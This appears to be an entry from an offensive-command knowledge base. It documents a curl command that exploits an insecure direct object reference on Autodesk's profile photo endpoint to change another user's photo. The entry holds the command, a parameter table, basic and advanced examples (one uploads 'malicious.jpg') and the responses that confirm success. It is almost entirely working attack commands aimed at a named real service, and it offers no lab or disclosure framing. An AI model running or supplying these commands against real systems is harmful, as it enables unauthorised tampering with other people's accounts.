---
data: >-
  curl -X POST -v -H "Cookie: your_session_cookie" -F "id=target_user_id" -F
  "photo=@/path/to/new_photo.jpg" "https://profile.autodesk.com/update-photo"
tags:
  - web
  - exploit
  - upload
type: command
output: null
executor: bash
platforms:
  - Web
id: c1cb29d3-c582-4d4f-a749-5cfd1cc94af0
created_at: '2025-12-14T17:30:27.242Z'
updated_at: '2025-12-14T17:30:27.242Z'
verified: false
validated: true
submitted: true
---
# Update Autodesk Profile Photo

## Command

```bash
curl -X POST -v -H "Cookie: your_session_cookie" -F "id=target_user_id" -F "photo=@/path/to/new_photo.jpg" "https://profile.autodesk.com/update-photo"
```

## Description

This command submits a photo update request to the Autodesk profile endpoint, exploiting IDOR by specifying a non-owned user ID. It uses multipart form data for file upload and requires authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-v` | Verbose mode | No |
| `-H "Cookie: ..."` | Authentication session cookie | Yes |
| `-F "id=..."` | Target user ID (vulnerable param) | Yes |
| `-F "photo=@file"` | Path to image file for upload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -v -H "Cookie: session=abc123" -F "id=456" -F "photo=@malicious.jpg" "https://profile.autodesk.com/update-photo"
```

### Advanced Usage

```bash
curl -X POST -v -H "Cookie: session=abc123" -H "Referer: https://profile.autodesk.com/edit-photo" -F "id=456" -F "photo=@/tmp/new.jpg" -F "csrf_token=xyz" "https://profile.autodesk.com/update-photo"
```

## Expected Output

Verbose HTTP exchange ending in 200 OK or 302 redirect, possibly with JSON {"success": true}. Failure may show 400/403 if params invalid, but success confirms IDOR exploitation.

## Related

- [[commands/fetch-autodesk-edit-page]]
